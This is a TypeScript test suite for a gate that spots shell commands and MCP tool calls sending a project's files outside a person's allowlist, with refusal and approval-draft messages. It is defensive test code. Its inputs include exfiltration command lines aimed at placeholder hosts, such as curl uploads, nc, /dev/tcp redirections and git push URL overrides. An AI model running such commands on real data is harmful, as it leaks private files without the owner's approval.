import { expect, test } from 'claude-code/testing'

import { checkResource } from '../hooks/authority'
import { hashText } from '../hooks/changes'
import {
  checkSend,
  classifyBash,
  classifyMcp,
  commandsOf,
  draftText,
  hostAllowed,
  hostOf,
  hostsNamed,
  insideHost,
  mayReachNetwork,
  newOutbound,
  outboundDelivery,
  outboundHash,
  outboundRefusal,
  outboundText,
  parseDraft,
  parseOutbound,
  patternOf,
  pushRefs,
  recipientsOf,
  remoteAllowed,
  treeVersion,
  widenOutbound,
  type OutboundConfig,
} from '../hooks/outbound'

// The outbound gate's pure logic: what sends the project's content outside, and the person's allowlist

const NONE = newOutbound()
const MINE: OutboundConfig = { ...newOutbound(), hosts: ['devbox', '*.corp.example'], remotes: ['origin'], recipients: ['me@example.com'] }
const MINE_GH: OutboundConfig = { ...newOutbound(), hosts: ['github.com'] }

test('outbound.json: its lists, a newer one left alone, junk said', () => {
  expect(parseOutbound(JSON.stringify({ outboundFormat: 1, hosts: ['devbox', 3], keep: true }))).toEqual({
    outbound: { outboundFormat: 1, hosts: ['devbox'], remotes: [], recipients: [], tools: { outbound: [], free: [] }, commands: [], outside: [], calls: [], inside: [], keep: true },
  })
  expect(parseOutbound('{"outboundFormat": 2}')).toEqual({ problem: 'outbound.json is from a newer fleet (outboundFormat 2): restart this session (u) to load it' })
  expect(parseOutbound('nope')).toEqual({ problem: "outbound.json isn't valid JSON" })
})

test('send --allow widens outbound.json: every other field kept, nothing twice; a newer one left alone', () => {
  const text = JSON.stringify({ outboundFormat: 1, hosts: ['devbox'], remotes: [], recipients: ['me@example.com'], keep: { x: 1 } })
  const w = widenOutbound(text, { hosts: ['DevBox', 'build.example.invalid'], remotes: ['git@example.invalid:me/proj.git'] })
  expect(w).toEqual({
    text: `${JSON.stringify({ outboundFormat: 1, hosts: ['devbox', 'build.example.invalid'], remotes: ['git@example.invalid:me/proj.git'], recipients: ['me@example.com'], keep: { x: 1 } }, null, 2)}\n`,
    added: { hosts: ['build.example.invalid'], remotes: ['git@example.invalid:me/proj.git'] },
  })
  expect((widenOutbound(null, { hosts: ['devbox'], remotes: [] }) as any).text).toBe(outboundText({ ...newOutbound(), hosts: ['devbox'] }))
  expect(widenOutbound('{"outboundFormat": 2}', { hosts: ['devbox'], remotes: [] })).toEqual({ problem: 'outbound.json is from a newer fleet (outboundFormat 2): restart this session (u) to load it' })
})

test('the hosts a note names: after ssh, an scp target, a URL other than the web’s; not prose, an address or this machine', () => {
  expect(hostsNamed('a Linux VM is ready: ssh ci@linuxbox.invalid (the key is in the vault).')).toEqual(['linuxbox.invalid'])
  expect(hostsNamed('ssh -p 2222 devbox, or copy to me@build.example.invalid:/srv')).toEqual(['devbox', 'build.example.invalid'])
  expect(hostsNamed('the bucket is s3://team-bucket/drop and sftp://files.example.invalid/in')).toEqual(['team-bucket.s3.amazonaws.com', 'files.example.invalid'])
  expect(hostsNamed('done at 12:30, ready: yes; docs at https://docs.example.invalid; write to me@example.com; ssh localhost')).toEqual([])
})

test('the asker of an outbound sent with --allow hears what is allowed from now on', () => {
  const spec = { to: 'devbox', why: 'w', what: 'ssh running a command', how: 'command' as const, draft: 'decisions/drafts/D-1.json', files: [], cwd: '/Users/x/proj', hash: 'h0' }
  expect(outboundDelivery('D-1', spec, { label: 'sent', text: 'it ran', allowed: ['devbox'] }, null)).toBe(
    "[D-1] The person approved your outbound (ssh running a command to devbox), and fleet ran it exactly as drafted, once: it ran. Don't run it again. The person also allowed devbox in outbound.json: from now on a send there needs no draft.",
  )
})

test('hosts: a URL, an scp target, an ssh destination, a bare host; this machine and the allowlist', () => {
  expect(hostOf('https://user@Example.invalid:8443/upload?x=1')).toBe('example.invalid')
  expect(hostOf('me@devbox:/srv/x')).toBe('devbox')
  expect(hostOf('devbox')).toBe('devbox')
  expect(hostOf('example.invalid/upload')).toBe('example.invalid')
  expect(hostOf('[::1]:22')).toBe('::1')
  expect(hostOf('/srv/bare.git')).toBe(null)
  expect(hostOf('file:///srv/bare.git')).toBe(null)
  expect(hostAllowed('devbox', MINE)).toBe(true)
  expect(hostAllowed('build.corp.example', MINE)).toBe(true)
  expect(hostAllowed('corp.example.evil', MINE)).toBe(false)
  expect(hostAllowed('localhost', NONE)).toBe(true)
  expect(hostAllowed('127.0.0.1', NONE)).toBe(true)
  expect(hostAllowed('example.invalid', MINE)).toBe(false)
  // A remote by the URL it goes to: "origin" allows the URL the project's own origin has (resolved there), never
  // another folder's origin
  const named = ['git@github.com:x/y.git']
  expect(remoteAllowed('git@github.com:x/y.git', MINE, named)).toBe(true)
  expect(remoteAllowed('git@github.com:x/y', MINE, named)).toBe(true)
  expect(remoteAllowed('git@github.com:someone/fork.git', MINE, named)).toBe(false)
  expect(remoteAllowed('git@github.com:x/y.git', MINE)).toBe(false)
  expect(remoteAllowed(null, MINE, named)).toBe(false)
  expect(remoteAllowed('devbox:repos/y.git', MINE)).toBe(true)
  expect(remoteAllowed('git@example.invalid:me/tools.git', { ...NONE, remotes: ['git@example.invalid:me/*'] })).toBe(true)
  expect(remoteAllowed('/srv/bare.git', NONE)).toBe(true)
  expect(remoteAllowed('../bare.git', NONE)).toBe(true)
})

test('a shell line: its simple commands, through pipes, lists, $( ), bash -c and the shell’s own words', () => {
  expect(commandsOf(`cd notes && curl -s -d @x.md "https://a.invalid/u" | tee out 2>&1 > log; echo done`)).toEqual([
    ['cd', 'notes'],
    ['curl', '-s', '-d', '@x.md', 'https://a.invalid/u'],
    ['tee', 'out'],
    ['echo', 'done'],
  ])
  expect(commandsOf(`echo "$(scp f h:/x)"`)).toEqual([['scp', 'f', 'h:/x'], ['echo', '$(scp f h:/x)']])
  expect(commandsOf(`bash -c 'curl -T a b.invalid'`)).toContainEqual(['curl', '-T', 'a', 'b.invalid'])
  expect(classifyBash('if true; then curl -d x https://a.invalid; fi', NONE).sends).toHaveLength(1)
  // A here-document's lines are text, not commands (a journal written with cat that mentions what was refused)
  const journal = "mkdir -p journals && cat >> journals/a.md <<'EOF'\n- curl -d @notes/x.md https://example.invalid/upload was refused\n- (ssh BatchMode to devbox): failed\nEOF\necho done"
  expect(commandsOf(journal)).toEqual([['mkdir', '-p', 'journals'], ['cat'], ['echo', 'done']])
  expect(classifyBash(journal, NONE).sends).toEqual([])
  expect(classifyBash('cat <<< "curl -d x a.invalid"', NONE).sends).toEqual([])
  // ... unless a shell (or ssh) on the line reads its commands from them
  expect(commandsOf('cat <<-END | sh\n\tscp x far.invalid:\n\tEND\ncurl -T y z.invalid')).toEqual([['cat'], ['sh'], ['curl', '-T', 'y', 'z.invalid'], ['scp', 'x', 'far.invalid:']])
  expect(classifyBash('bash <<EOF\ncurl -d @x https://far.invalid\nEOF', NONE).sends).toHaveLength(1)
  expect(classifyBash('ssh devbox <<EOF\nscp x far.invalid:\nEOF', MINE).sends).toHaveLength(1)
  expect(classifyBash('python3 - <<EOF\nprint("curl -d x a.invalid")\nEOF', NONE).sends).toEqual([])
})

test('Bash: what sends content outside, and what passes', () => {
  const held = (line: string, c = NONE) => classifyBash(line, c).sends
  expect(held('curl -d @notes/x.md https://example.invalid/upload')).toEqual([{ what: 'curl sending data (notes/x.md)', to: ['example.invalid'], files: ['notes/x.md'], hosts: ['example.invalid'] }])
  expect(held('curl -F "file=@docs/plan.pdf;type=application/pdf" https://a.invalid')[0]?.files).toEqual(['docs/plan.pdf'])
  expect(held('curl -T build.tgz https://a.invalid/')[0]?.files).toEqual(['build.tgz'])
  expect(held('curl -X POST https://a.invalid/hook')).toHaveLength(1)
  expect(held('curl -sSd hello https://a.invalid')).toHaveLength(1)
  expect(held('wget --post-file=notes/x.md https://a.invalid')[0]?.files).toEqual(['notes/x.md'])
  expect(held('scp notes/x.md me@far.invalid:/tmp/')).toEqual([{ what: 'scp of notes/x.md', to: ['far.invalid'], files: ['notes/x.md'], hosts: ['far.invalid'] }])
  expect(held('rsync -av notes/ far.invalid:backup/')).toHaveLength(1)
  expect(held('sftp far.invalid')).toHaveLength(1)
  expect(held('ssh -o BatchMode=yes far.invalid true')).toEqual([{ what: 'ssh running a command', to: ['far.invalid'], files: [], hosts: ['far.invalid'] }])
  expect(held('gh gist create notes/x.md')).toHaveLength(1)
  expect(held('gh api -X POST repos/x/y/issues -f title=t')).toHaveLength(1)
  expect(held('echo hi | mail -s hi someone@else.invalid')).toHaveLength(1)
  expect(held('nc far.invalid 9000 < notes/x.md')).toHaveLength(1)
  expect(held('git send-email --to=a@b.invalid 0001.patch')).toHaveLength(1)
  // The person's own hosts and addresses, this machine, reading the web, local commands
  expect(held('ssh -o BatchMode=yes -o ConnectTimeout=1 devbox true', MINE)).toEqual([])
  expect(held('scp notes/x.md me@devbox:/srv/', MINE)).toEqual([])
  expect(held('curl -d @x http://localhost:8080/api')).toEqual([])
  expect(held('echo hi | mail -s hi me@example.com', MINE)).toEqual([])
  expect(held('scp far.invalid:/tmp/x notes/')).toEqual([])
  expect(held('curl -s https://example.invalid/page')).toEqual([])
  expect(classifyBash('curl -s https://example.invalid/page', NONE).reads).toEqual(['example.invalid'])
  // gh's reads of what anyone wrote there mark (they hold nothing), unless outbound.json has the host
  for (const line of ['gh issue view 12 --comments', 'gh pr diff 3', 'gh pr checks 3', 'gh issue list', 'gh api repos/o/r/issues', 'gh search issues cache', 'gh release view v1']) {
    expect(classifyBash(line, NONE)).toEqual({ sends: [], pushes: [], reads: ['github.com'] })
  }
  expect(classifyBash('glab mr view 4', NONE).reads).toEqual(['gitlab.com'])
  expect(classifyBash('gh --hostname ghe.corp.example pr view 3', NONE).reads).toEqual(['ghe.corp.example'])
  expect(classifyBash('gh pr view 3', MINE_GH).reads).toEqual([])
  expect(classifyBash('gh auth status', NONE).reads).toEqual([])
  expect(held('grep -r curl notes/ && cat notes/x.md && git status && git push --dry-run')).toEqual([])
  expect(held('nc -l 9000')).toEqual([])
  // What ssh runs on the person's own machine goes through the same rules
  expect(held('ssh devbox "curl -d @x https://far.invalid"', MINE)).toHaveLength(1)
  // git push: its remote is looked up afterwards
  expect(classifyBash('git -C sub push -u fork main', NONE).pushes).toEqual([{ remote: 'fork', cwd: 'sub', words: ['-u', 'fork', 'main'] }])
  expect(classifyBash('git push', NONE).pushes).toEqual([{ remote: null, cwd: null, words: [] }])
  // The branches a push names: src:dst, none (the current one), every one
  expect(pushRefs(['origin', 'area-b/cli'])).toEqual([{ local: 'area-b/cli', remote: 'area-b/cli' }])
  expect(pushRefs(['-u', 'origin', '+HEAD:refs/heads/topic', ':old'])).toEqual([{ local: 'HEAD', remote: 'topic' }])
  expect(pushRefs([])).toEqual([])
  expect(pushRefs(['--all', 'origin'])).toBe(null)
  expect(classifyBash('git -c color.ui=always push origin', NONE).pushes).toHaveLength(1)
  // ... unless where it goes isn't its remote's URL: a url set on the line, --repo, another receive-pack
  expect(held('git -c remote.origin.pushurl=https://far.invalid/x.git push origin')).toEqual([{ what: 'git push with -c remote.origin.pushurl=https://far.invalid/x.git', to: ['origin'], files: [] }])
  expect(held('git -c url.https://far.invalid/.insteadOf=https://github.com/ push')).toHaveLength(1)
  expect(held('git push --repo=https://far.invalid/x.git')[0]?.what).toBe('git push with --repo')
  expect(held("git push --receive-pack='ssh far.invalid git-receive-pack' origin")[0]?.what).toBe('git push with --receive-pack')
  // After a cd, from the folder it went to (moved); after one fleet can't follow, held
  expect(classifyBash('cd /Users/x/other && git push origin', NONE).pushes).toEqual([{ remote: 'origin', cwd: '/Users/x/other', words: ['origin'], moved: true }])
  expect(classifyBash('cd code; cd sub && git -C lib push', NONE).pushes).toEqual([{ remote: null, cwd: 'code/sub/lib', words: [], moved: true }])
  expect(classifyBash('(cd /Users/x/other && git -C /Users/x/proj push)', NONE).pushes).toEqual([{ remote: null, cwd: '/Users/x/proj', words: [] }])
  expect(held('cd "$OTHER" && git push')).toEqual([{ what: 'git push after a cd fleet can’t follow', to: ['its remote'], files: [] }])
  expect(held('cd - && git push origin')).toHaveLength(1)
  // A command the person named
  expect(held('myupload notes', { ...NONE, commands: ['myupload'] })).toHaveLength(1)
})

test('Bash: package registries, images, cloud storage, glab, ftp, shares and /dev/tcp send; a host the command names that outbound.json allows passes', () => {
  const held = (line: string, c = NONE) => classifyBash(line, c).sends
  const CORP: OutboundConfig = { ...newOutbound(), hosts: ['*.corp.example', 'docker.io'] }
  // Package registries: the registry is known only when the command names it (else a file an instance may write
  // decides)
  expect(held('npm publish')).toEqual([{ what: 'npm publish', to: ['the registry npm is set to'], files: [] }])
  expect(held('npm publish --registry https://npm.corp.example', CORP)).toEqual([])
  expect(held('npm publish --dry-run')).toEqual([])
  expect(held('yarn npm publish')[0]?.what).toBe('yarn publish')
  expect(held('pnpm -r publish --registry https://npm.example.invalid')[0]?.hosts).toEqual(['npm.example.invalid'])
  expect(held('cargo publish')[0]?.to).toEqual(['the registry cargo is set to'])
  expect(held('cargo publish --index sparse+https://crates.corp.example/index/', CORP)).toEqual([])
  expect(held('twine upload dist/pkg.whl')).toEqual([{ what: 'twine upload of dist/pkg.whl', to: ['the package index twine is set to'], files: ['dist/pkg.whl'] }])
  expect(held('poetry publish --build')[0]?.what).toBe('poetry publish')
  expect(held('gem push pkg.gem --host https://gems.corp.example', CORP)).toEqual([])
  // Images: the registry is the image name's
  expect(held('docker push registry.example.invalid/x:1')).toEqual([{ what: 'docker push of registry.example.invalid/x:1', to: ['registry.example.invalid'], files: [], hosts: ['registry.example.invalid'] }])
  expect(held('docker push team/x:1')[0]?.to).toEqual(['docker.io'])
  expect(held('docker push team/x:1', CORP)).toEqual([])
  expect(held('docker push localhost:5000/x')).toEqual([])
  expect(held('docker buildx build --push -t registry.example.invalid/x .')[0]?.to).toEqual(['registry.example.invalid'])
  expect(held('podman push x')[0]?.to).toEqual(['the registry podman is set to'])
  expect(held('podman push x oci-archive:/tmp/x.tar')).toEqual([])
  // Cloud storage: an upload to a bucket, not a download from one
  expect(held('aws s3 cp notes/plan.md s3://bucket/')).toEqual([{ what: 'aws s3 cp of notes/plan.md', to: ['bucket.s3.amazonaws.com'], files: ['notes/plan.md'], hosts: ['bucket.s3.amazonaws.com'] }])
  expect(held('aws s3 sync s3://bucket/ notes/')).toEqual([])
  expect(held('aws s3 sync notes s3://bucket/ --exclude "*.tmp" --dryrun')).toEqual([])
  expect(held('aws s3api put-object --bucket bucket --key k --body notes/plan.md')[0]?.files).toEqual(['notes/plan.md'])
  expect(held('aws --endpoint-url https://s3.corp.example s3 cp x s3://b/', CORP)).toEqual([])
  expect(held('gsutil -m cp -r notes gs://bucket/')).toEqual([{ what: 'gsutil cp of notes', to: ['bucket.storage.googleapis.com'], files: ['notes'], hosts: ['bucket.storage.googleapis.com'] }])
  expect(held('gcloud storage cp notes/plan.md gs://bucket/')[0]?.what).toBe('gcloud storage cp of notes/plan.md')
  expect(held('az storage blob upload --account-name acct -c box -f notes/plan.md -n plan.md')[0]).toMatchObject({ to: ['acct.blob.core.windows.net'], files: ['notes/plan.md'] })
  expect(held('rclone copy notes remote:bucket')).toEqual([{ what: 'rclone copy of notes', to: ['the rclone remote remote'], files: ['notes'] }])
  expect(held('rclone copy remote:bucket notes')).toEqual([])
  // GitLab's CLI with gh's verbs
  expect(held('glab mr create --fill')).toEqual([{ what: 'glab mr create', to: ['gitlab.com'], files: [], hosts: ['gitlab.com'] }])
  expect(held('glab issue note 12 -m "done"')).toHaveLength(1)
  expect(held('glab mr list')).toEqual([])
  // File transfer and shares
  expect(held('ftp example.invalid')[0]?.to).toEqual(['example.invalid'])
  expect(held('lftp -e "put notes/plan.md" example.invalid')[0]?.to).toEqual(['example.invalid'])
  expect(held('lftp -c "open -u me ftp.corp.example; put x"', CORP)).toEqual([])
  expect(held('smbclient //files.example.invalid/share -c "put notes/plan.md"')[0]?.to).toEqual(['files.example.invalid'])
  expect(held('smbclient -L files.example.invalid')).toEqual([])
  // A redirection to /dev/tcp or /dev/udp: the shell opens the connection itself
  expect(held('cat notes/plan.md > /dev/tcp/example.invalid/80')).toEqual([{ what: 'a redirection to /dev/tcp', to: ['example.invalid'], files: [], hosts: ['example.invalid'] }])
  expect(held('echo x >& /dev/udp/example.invalid/53')).toHaveLength(1)
  expect(held('exec 3<>/dev/tcp/127.0.0.1/8080')).toEqual([])
  expect(held('cat x > /dev/tcp/build.corp.example/80', CORP)).toEqual([])
  // An archive a sending line makes: its sources are what goes out
  expect(held('tar czf - notes | ssh far.invalid "cat > n.tgz"')[0]?.files).toEqual(['notes'])
  expect(held('tar -C docs -czf out.tgz . && scp out.tgz far.invalid:')[0]?.files).toEqual(['out.tgz', 'docs'])
  expect(held('zip -qr - notes | ssh far.invalid "cat > n.zip"')[0]?.files).toEqual(['notes'])
  expect(held("zip out.zip -r notes docs -x '*.tmp' && scp out.zip far.invalid:")[0]?.files).toEqual(['out.zip', 'notes', 'docs'])
  expect(held('zip -r out.zip notes')).toEqual([])
})

test('Bash: an endpoint, registry or proxy the environment names is where it goes too; a variable with no such meaning is harmless', () => {
  const held = (line: string, c = NONE) => classifyBash(line, c).sends
  const OWN: OutboundConfig = { ...newOutbound(), hosts: ['*.s3.amazonaws.com', 'registry.npmjs.org', '*.corp.example', 'devbox', 'github.com'] }
  // It replaces the command's own: an upload to the bucket goes to the endpoint, a publish to the registry
  expect(held('AWS_ENDPOINT_URL=https://x.far.example aws s3 cp notes/plan.md s3://bucket/', OWN)).toEqual([{ what: 'aws s3 cp of notes/plan.md', to: ['x.far.example'], files: ['notes/plan.md'], hosts: ['x.far.example'] }])
  expect(held('env AWS_ENDPOINT_URL_S3=http://localhost:9000 aws s3 cp notes s3://bucket/')).toEqual([])
  expect(held('NPM_CONFIG_REGISTRY=https://npm.far.example npm publish', OWN)).toEqual([{ what: 'npm publish', to: ['npm.far.example'], files: [], hosts: ['npm.far.example'] }])
  expect(held('env npm_config_registry=https://npm.corp.example npm publish', OWN)).toEqual([])
  expect(held('TWINE_REPOSITORY_URL=https://pypi.corp.example/ twine upload dist/x.whl', OWN)).toEqual([])
  expect(held('GH_HOST=ghe.far.example gh pr create --fill', OWN)).toEqual([{ what: 'gh pr create', to: ['ghe.far.example'], files: [], hosts: ['ghe.far.example'] }])
  expect(held('gh pr create --fill', OWN)).toEqual([])
  // Or it goes through it: a proxy, for the web's protocols; an export earlier on the line counts
  expect(held('HTTPS_PROXY=http://proxy.far.example curl -d @notes/x.md https://devbox/upload', OWN)).toEqual([{ what: 'curl with HTTPS_PROXY', to: ['proxy.far.example'], files: ['notes/x.md'], hosts: ['proxy.far.example'] }])
  expect(held('export https_proxy=http://proxy.far.example; curl -T notes/x.md https://devbox/', OWN)[0]?.to).toEqual(['proxy.far.example'])
  expect(held('HTTPS_PROXY=http://proxy.corp.example curl -d @notes/x.md https://devbox/upload', OWN)).toEqual([])
  expect(held('HTTPS_PROXY=http://proxy.far.example scp notes/x.md devbox:/srv/', OWN)).toEqual([])
  expect(held('HTTPS_PROXY=http://proxy.far.example curl -s https://example.invalid/page', OWN)).toEqual([])
  // A send to a host it doesn't allow says that host once
  expect(held('HTTPS_PROXY=http://far.invalid curl -d x https://far.invalid/', OWN)).toEqual([{ what: 'curl sending data', to: ['far.invalid'], files: [], hosts: ['far.invalid'] }])
  // git's ssh command: a jump host goes too, a key doesn't; a configuration that names a url can't be read
  const push = classifyBash("GIT_SSH_COMMAND='ssh -J jump.far.example' git push origin main", OWN)
  expect(push.sends).toEqual([{ what: 'git with GIT_SSH_COMMAND', to: ['jump.far.example'], files: [], hosts: ['jump.far.example'] }])
  expect(push.pushes).toHaveLength(1)
  expect(held("GIT_SSH_COMMAND='ssh -i ~/.ssh/deploy -o StrictHostKeyChecking=yes' git push origin main", OWN)).toEqual([])
  expect(held('GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://far.example/.insteadOf GIT_CONFIG_VALUE_0=https://github.com/ git push', OWN)).toEqual([{ what: 'git with GIT_CONFIG_KEY_0', to: ['where GIT_CONFIG_KEY_0 points'], files: [] }])
  expect(held('GIT_CONFIG_GLOBAL=/tmp/x.gitconfig git status', OWN)).toEqual([])
  // Plain variables say nothing
  expect(held('DEBUG=1 NODE_ENV=production FOO=https://far.example scp notes/x.md devbox:/srv/', OWN)).toEqual([])
})

test('when the gate erred: a command that may reach the network is refused; local git and a local copy run', () => {
  for (const line of ['git push', 'git -C sub push origin', 'cd x && git fetch', 'git pull --rebase', 'git clone https://x.invalid/r.git', 'git ls-remote origin', 'git send-email x.patch', 'ssh far.invalid true', 'scp notes/x.md far.invalid:/tmp/', "rsync -av notes/ 'me@far.invalid:backup/'", 'curl https://x.invalid', 'npm publish']) {
    expect([line, mayReachNetwork(line)]).toEqual([line, true])
  }
  for (const line of ['git status', 'git log --oneline -5', 'git commit -m "push the fix"', 'git -C sub diff HEAD~1', 'ssh-keygen -l -f key', 'scp a.md b.md', 'rsync -a notes/ backup/', 'ls -la']) {
    expect([line, mayReachNetwork(line)]).toEqual([line, false])
  }
})

test('MCP: a tool that sends, one that reads outside content, one that does neither; the lists and recipients', () => {
  const c = (tool: string, input: Record<string, unknown> = {}, cfg = NONE) => classifyMcp(tool, input, cfg)
  expect(c('mcp__claude_ai_Gmail__send_message', { to: 'x@y.invalid', body: 'b' })).toEqual({ send: { what: 'send_message on claude_ai_Gmail', to: ['x@y.invalid'], files: [] }, outside: false })
  expect(c('mcp__claude_ai_Gmail__send_message', { to: 'me@example.com' }, MINE).send).toBe(null)
  expect(c('mcp__claude_ai_Gmail__create_draft', { to: ['me@example.com', 'x@y.invalid'] }, MINE).send?.to).toEqual(['me@example.com', 'x@y.invalid'])
  expect(c('mcp__claude_ai_Gmail__search_threads')).toEqual({ send: null, outside: true })
  expect(c('mcp__claude_ai_Gmail__get_draft')).toEqual({ send: null, outside: true })
  expect(c('mcp__claude_ai_Gmail__label_message')).toEqual({ send: null, outside: false })
  expect(c('mcp__claude-in-chrome__computer').send?.to).toEqual(['claude-in-chrome'])
  expect(c('mcp__claude-in-chrome__get_page_text')).toEqual({ send: null, outside: true })
  // A navigation carries what its URL says: held
  expect(c('mcp__claude-in-chrome__navigate', { url: 'https://far.invalid/?q=notes' }).send?.to).toEqual(['claude-in-chrome'])
  // The verbs that send as a tool's verb, where a read names the same thing elsewhere
  for (const tool of ['mcp__drive__copy_file', 'mcp__s3__sync_bucket', 'mcp__jira__add_attachment', 'mcp__x__set_value', 'mcp__x__deploy', 'mcp__discord__message', 'mcp__x__draft_email', 'mcp__x__release', 'mcp__x__transfer_file', 'mcp__x__import_rows', 'mcp__git__commit', 'mcp__drive__drive_copy_file']) {
    expect(c(tool).send?.what).toBe(`${tool.split('__')[2]} on ${tool.split('__')[1]}`)
  }
  expect(c('mcp__claude_ai_Gmail__get_message')).toEqual({ send: null, outside: true })
  expect(c('mcp__claude_ai_Gmail__list_drafts')).toEqual({ send: null, outside: true })
  expect(c('mcp__claude_ai_Gmail__trash_message')).toEqual({ send: null, outside: false })
  expect(c('mcp__git__list_commits')).toEqual({ send: null, outside: false })
  // Signing in neither sends nor brings outside text back
  expect(c('mcp__claude_ai_Google_Drive__authenticate')).toEqual({ send: null, outside: false })
  expect(c('mcp__claude_ai_Dropbox_MCP__complete_authentication')).toEqual({ send: null, outside: false })
  expect(c('mcp__slack__chat_postMessage').send).not.toBe(null)
  expect(c('mcp__plugin-authoring__scan_secrets')).toEqual({ send: null, outside: false })
  expect(c('mcp__claude_ai_Claude_Docs__batch')).toEqual({ send: null, outside: false })
  expect(c('mcp__fleet__send')).toEqual({ send: null, outside: false })
  expect(c('mcp__notes__sync', {}, { ...NONE, tools: { outbound: ['mcp__notes__*'], free: [] } }).send).not.toBe(null)
  expect(c('mcp__slack__chat_postMessage', {}, { ...NONE, tools: { outbound: [], free: ['mcp__slack__*'] } }).send).toBe(null)
  expect(c('mcp__wiki__page', {}, { ...NONE, outside: ['mcp__wiki__*'] })).toEqual({ send: null, outside: true })
  expect(recipientsOf({ to: 'a@x.invalid, b@x.invalid', attendees: [{ email: 'c@x.invalid' }] })).toEqual(['a@x.invalid', 'b@x.invalid', 'c@x.invalid'])
})

test('mcp__fleet__send: its input, the draft fleet keeps and runs, the version the person approves', () => {
  expect(checkSend({ to: 'example.invalid', why: 'share the notes', command: 'curl -d @x https://example.invalid' })).toEqual({ ok: true, send: { to: 'example.invalid', why: 'share the notes', command: 'curl -d @x https://example.invalid', files: [] } })
  expect(checkSend({ to: 'x', why: 'y' })).toEqual({ ok: false, reason: 'give either command (the exact Bash command) or mcp_tool and input (an MCP call), not both' })
  expect(checkSend({ to: 'x', why: 'y', mcp_tool: 'mcp__fleet__decide' })).toEqual({ ok: false, reason: "mcp_tool: fleet's own tools send nothing outside" })
  expect(checkSend({ to: 'x', why: 'y', mcp_tool: 'Bash' })).toEqual({ ok: false, reason: 'mcp_tool: an MCP tool, mcp__<server>__<tool>' })
  const tool = checkSend({ to: 'x@y.invalid', why: 'thanks', mcp_tool: 'mcp__claude_ai_Gmail__send_message', input: { to: 'x@y.invalid', body: 'Thanks' } })
  expect(tool.ok).toBe(true)
  const text = draftText((tool as any).send)
  expect(parseDraft(text)).toEqual({ tool: 'mcp__claude_ai_Gmail__send_message', input: { to: 'x@y.invalid', body: 'Thanks' } })
  expect(parseDraft('{"tool": "mcp__fleet__send"}')).toEqual({ problem: 'the draft holds neither a command nor an MCP tool and its input' })
  const a = outboundHash(text, [{ path: 'notes/x.md', v: 'h1' }], hashText)
  expect(outboundHash(text, [{ path: 'notes/x.md', v: 'h2' }], hashText)).not.toBe(a)
  // A folder's version is its files' paths and versions; a pattern in the last part of a path is listed
  const tree = treeVersion([{ path: 'a.py', v: 'h1' }, { path: 'sub/b.py', v: 'h2' }], false, hashText)
  expect(treeVersion([{ path: 'a.py', v: 'h1' }, { path: 'sub/b.py', v: 'h3' }], false, hashText)).not.toBe(tree)
  expect(treeVersion([{ path: 'a.py', v: 'h1' }, { path: 'sub/b.py', v: 'h2' }], true, hashText)).not.toBe(tree)
  expect(patternOf('/x/dist/*.whl')).toEqual({ dir: '/x/dist', name: '*.whl' })
  expect(patternOf('/x/*/a.whl')).toBe(null)
  expect(patternOf('/x/dist/')).toBe(null)
  // A long to, why or blocks is cut, never in the middle of a character
  const long = checkSend({ to: `${'a'.repeat(299)}\u{1F600}`, why: `${'b'.repeat(299)}\u{1F600}`, command: 'x', blocks: `${'c'.repeat(199)}\u{1F600}` })
  expect(long).toEqual({ ok: true, send: { to: 'a'.repeat(299), why: 'b'.repeat(299), command: 'x', files: [], blocks: 'c'.repeat(199) } })
  expect(checkResource({ what: `${'d'.repeat(199)}\u{1F600}`, why: 'w' })).toEqual({ ok: true, resource: { what: 'd'.repeat(199), why: 'w' } })
  expect(outboundRefusal([{ what: 'scp of x', to: ['far.invalid'], files: ['x'] }], 'command', true)).toContain('This session was started from a background session of the project (it inherited CLAUDE_JOB_DIR or FLEET_INSTANCE), and nobody is at it: say in your result what should go out, where and why, and the session that started you drafts it with mcp__fleet__send')
  expect(outboundRefusal([{ what: 'curl sending data (notes/x.md)', to: ['example.invalid'], files: ['notes/x.md'] }], 'command')).toContain(
    "fleet: this command would send the project's content outside it (curl sending data (notes/x.md) to example.invalid), which needs the person's approval, so it was not run. If it should go out, draft it with mcp__fleet__send",
  )
})

test('a read verb wins over a leading noun: a search with a recipient filter reads, sends nothing', () => {
  const c = (tool: string, input: Record<string, unknown> = {}) => classifyMcp(tool, input, NONE)
  expect(c('mcp__claude_ai_Office__chat_message_search', { query: '*', recipient: 'someone@example.org' })).toEqual({ send: null, outside: true })
  expect(c('mcp__claude_ai_Office__message_list', { from: 'someone@example.org' })).toEqual({ send: null, outside: true })
  expect(c('mcp__discord__message', { to: 'someone@example.org' }).send).not.toBe(null)
  expect(c('mcp__claude_ai_Office__send_chat_message', { chatId: '19:aaaa', body: 'hi' }).send).not.toBe(null)
  expect(c('mcp__x__draft_email').send).not.toBe(null)
})

test('outbound.json calls: one chat of a sending tool passes, for the instances it names; the rest of the tool is held', () => {
  const tool = 'mcp__claude_ai_Office__send_chat_message'
  const parsed = parseOutbound(JSON.stringify({ outboundFormat: 1, calls: [{ tool: 'mcp__claude_ai_Office__send_*', match: { chatId: '19:aaaa*' }, instances: ['Liaison'] }, { tool: 'mcp__x__y' }, { tool: 'mcp__x__z', match: {} }] }))
  if (!('outbound' in parsed)) throw new Error('no outbound')
  const cfg = parsed.outbound
  expect(cfg.calls).toEqual([{ tool: 'mcp__claude_ai_Office__send_*', match: { chatId: '19:aaaa*' }, instances: ['Liaison'] }])
  expect(classifyMcp(tool, { chatId: '19:aaaa@thread', body: 'hi' }, cfg, 'Liaison').send).toBe(null)
  expect(classifyMcp(tool, { chatId: '19:aaaa@thread', body: 'hi' }, cfg, 'liaison').send).toBe(null)
  expect(classifyMcp(tool, { chatId: '19:aaaa@thread', body: 'hi' }, cfg, 'Owner A').send).not.toBe(null)
  expect(classifyMcp(tool, { chatId: '19:aaaa@thread', body: 'hi' }, cfg, null).send).not.toBe(null)
  expect(classifyMcp(tool, { chatId: '19:bbbb@thread', body: 'hi' }, cfg, 'Liaison').send).not.toBe(null)
  expect(classifyMcp(tool, { body: 'hi' }, cfg, 'Liaison').send).not.toBe(null)
  // None named: any session
  const any: OutboundConfig = { ...newOutbound(), calls: [{ tool, match: { chatId: '19:aaaa' }, instances: [] }] }
  expect(classifyMcp(tool, { chatId: '19:aaaa', body: 'hi' }, any, null).send).toBe(null)
})

test('outbound.json inside: the person’s own tools and hosts are no outside content', () => {
  const cfg: OutboundConfig = { ...newOutbound(), inside: ['mcp__claude_ai_Office__search_people', '*.intranet.example', 'wiki.example.org'] }
  expect(classifyMcp('mcp__claude_ai_Office__search_people', { query: 'x' }, cfg)).toEqual({ send: null, outside: false })
